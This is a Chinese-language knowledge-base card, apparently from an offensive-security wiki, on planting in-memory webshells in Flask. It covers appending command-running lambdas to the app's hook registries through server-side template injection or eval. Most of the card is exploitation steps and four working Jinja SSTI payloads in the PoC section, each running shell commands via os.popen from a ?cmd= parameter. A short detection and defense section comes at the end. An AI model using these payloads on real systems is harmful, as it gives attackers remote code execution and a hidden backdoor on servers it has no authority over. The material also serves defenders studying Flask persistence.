---
id: web-python-framework-flask-hook-registry-memshell
title: Flask 钩子注册表内存马：SSTI/eval 直接改写 before/after/url_value/template_context 钩子
type: scenario
domain: web
path: web/python/framework
technique: flask-hook-registry-memshell
tags:
- web
- python
- flask
- ssti
- memshell
- persistence
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:04:10+08:00'
  notes: 已对照原文与图01/03/04/05核对：SSTI 可取得 __builtins__/eval，before_request 装饰器在首个请求后抛 setupmethod AssertionError（图04），after_request 无参 lambda 抛 TypeError（图05），说明必须直接改注册表。卡中 before/after/url_value/template_context 四类钩子的参数与回显约定符合 Flask 3.x 源码；template_context_processors 与 url_value_preprocessors 为 defaultdict，before/after_request_funcs 需 setdefault，描述正确。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/python/framework/web-python-framework-flask-hook-registry-memshell/
draft: false
kb_aliases:
- Flask 内存马
- 钩子内存马
- before_request_funcs
- after_request_funcs
- url_value_preprocessors
- template_context_processors
- 进程内持久化后门
---

## 一句话结论

在 Flask 应用里拿到 SSTI 或任意 `eval` 后，不必新增路由，直接把 `lambda` 追加进 `app.before_request_funcs`、`after_request_funcs`、`url_value_preprocessors`、`template_context_processors` 等注册表，就能把命令执行逻辑常驻在进程内存中，之后每个请求都会自动触发。

## 原理

- Flask 的装饰器（`@app.before_request`、`@app.after_request`、`@app.context_processor`、`@app.url_value_preprocessor`）都带 `@setupmethod`，在 `_got_first_request=True` 之后调用会抛 `AssertionError`，所以运行期无法再走装饰器注册。
- 但装饰器底层只是把函数 append 进 `app` 上的普通 dict/list：`before_request_funcs.setdefault(None, []).append(f)`、`after_request_funcs.setdefault(None, []).append(f)`、`url_value_preprocessors[None].append(f)`、`template_context_processors[None].append(f)`。这些容器是可变对象，攻击者用 `eval` 直接改数据结构即可绕过 `@setupmethod`。
- 钩子点是 Flask 主循环固定调用的位置，因此注入一次后，后续所有请求都会执行；`None` 键表示 App 级全局钩子，对所有蓝图/路由生效（包括 404）。
- 不同钩子的调用约定不同，lambda 的参数与回显方式必须匹配：
  - `before_request_funcs`：无参调用，返回非 `None` 会短路并作为响应回显；
  - `after_request_funcs`：被传入 `response` 且必须返回 `Response` 对象，否则参数数量或类型错误导致 500；
  - `url_value_preprocessors`：传入 `(endpoint, values)`，返回值被忽略，只能靠抛异常在 debug 模式回显；
  - `template_context_processors`：无参调用且必须返回 dict，返回值合并进模板上下文。

## 触发条件

- 存在 SSTI（`render_template_string` 拼接用户输入）或可直接 `eval`/`exec` 用户输入；
- `url_for.__globals__['__builtins__']['eval']`（或等价路径）可达，且 `current_app`、`request` 可取；
- 应用未重启；内存马只存在于当前进程，重启即失效；
- `after_request` 型需要能拿到 `Response` 对象并正确返回；`url_value_preprocessor` 型需要 debug 模式才能看到异常内容。

## 利用步骤

1. 确认 SSTI/eval：`{{url_for.__globals__['__builtins__']}}` 能看到 `eval` 即具备条件。
2. 取 `current_app` 作为 `app`，取 `request` 作为请求参数来源。
3. 按目标钩子的调用约定构造 lambda，用 `setdefault`/`append` 注入。
4. 访问任意路由（含 404）触发；用 `?cmd=` 动态传参。
5. 按需选择钩子：要稳定回显用 `before_request`；要不影响返回结构用 `after_request`；要影响模板渲染用 `template_context_processors`。

## PoC

`before_request`（无参，返回即回显，最直接）：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(request.args.get('cmd','whoami')).read() if 'cmd' in request.args else None)",
  {'app': url_for.__globals__['current_app'], 'request': url_for.__globals__['request']}
)}}
```

`after_request`（接收并返回 response，用 setattr 改 data）：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.after_request_funcs.setdefault(None, []).append(lambda response: (setattr(response, 'data', __import__('os').popen(request.args.get('cmd','whoami')).read().encode()), response)[1] if 'cmd' in request.args else response)",
  {'app': url_for.__globals__['current_app'], 'request': url_for.__globals__['request']}
)}}
```

`template_context_processors`（返回 dict，供模板取用）：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.template_context_processors[None].append(lambda: {'res': __import__('os').popen(request.args.get('cmd','whoami')).read()})",
  {'app': url_for.__globals__['current_app']}
)}}
```

`url_value_preprocessor`（debug 模式，抛异常回显）：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.url_value_preprocessors[None].append(lambda ep, args: (_ for _ in ()).throw(Exception(__import__('os').popen(request.args.get('cmd')).read())) if 'cmd' in request.args else None)",
  {'app': url_for.__globals__['current_app'], 'request': url_for.__globals__['request']}
)}}
```

## 变体与关联

- 路由型：`app.add_url_rule('/shell','shell',lambda: ...)` 在 Flask 2.3+/3.x 会因 `@setupmethod`（首个请求后 `_got_first_request=True`）抛 `AssertionError`；只有在首个请求前注入或修改 `_got_first_request` 等前提下才成立，现代版本不宜作为首选。
- `after_request` 另有 `response.set_data(cmd, response)[1]` 与 `exec("global CmdResp; CmdResp=make_response(...)")` 两种返回 Response 的写法。
- `error_handler_spec` 在 Flask 3.1 实测直接改字典不生效（仍返回原 404），不推荐。
- 与组件注册型（`jinja_env.globals`/`filters`、`handle_user_exception`、`process_response`）同属 Flask 内存马，见关联卡片。
- 与 Java 内存马对比：都是把恶意逻辑挂到框架的常驻注册表，进程重启即消失。

## 检测与防御

- 禁止把用户输入交给 `render_template_string`/`eval`/`exec`；SSTI 是内存马的前置条件。
- 生产关闭 debug（避免异常回显与调试器），关闭 `TRAP_BAD_REQUEST_ERRORS` 等调试配置。
- 运行期校验 `app.before_request_funcs`、`after_request_funcs`、`url_value_preprocessors`、`template_context_processors` 的函数数量与来源，发现匿名 lambda/异常函数即告警。
- 发现入侵后重启进程并轮换密钥；仅删除单个路由/钩子不足以清除全部植入点。
- 日志监控对同一路径高频带 `cmd`/`code` 参数、异常堆栈中出现 `os.popen` 等特征。
